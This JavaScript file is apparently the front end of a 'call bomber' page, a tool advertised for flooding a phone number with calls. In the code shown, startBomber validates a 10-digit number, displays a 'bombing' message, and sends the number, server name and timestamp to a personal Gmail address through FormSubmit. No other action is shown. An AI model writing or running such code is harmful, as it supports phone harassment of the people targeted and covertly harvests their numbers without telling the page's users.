function startBomber(serverName) {
  const phone = document.getElementById("phoneInput").value;
  const box = document.getElementById("animationBox");

  if (phone.length !== 10 || isNaN(phone)) {
    alert("⚠️ Please enter a valid 10-digit mobile number.");
    return;
  }

  box.innerHTML = `👉 Starting Call Bomber on ${serverName}...`;

  // Send data to your Gmail (using FormSubmit free)
  fetch("https://formsubmit.co/ajax/mrriteek8225@gmail.com", {
    method: "POST",
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json'
    },
    body: JSON.stringify({
      name: serverName,
      message: `Number: ${phone}, Server: ${serverName}, Time: ${new Date().toLocaleString()}`
    })
  }).then(response => response.json())
    .then(data => {
      console.log("📩 Sent to email:", data);
    }).catch(error => {
      console.error("❌ Email error:", error);
    });
}

function stopBomber() {
  const box = document.getElementById("animationBox");
  box.innerHTML = "🛑 Bombing Stopped!";
}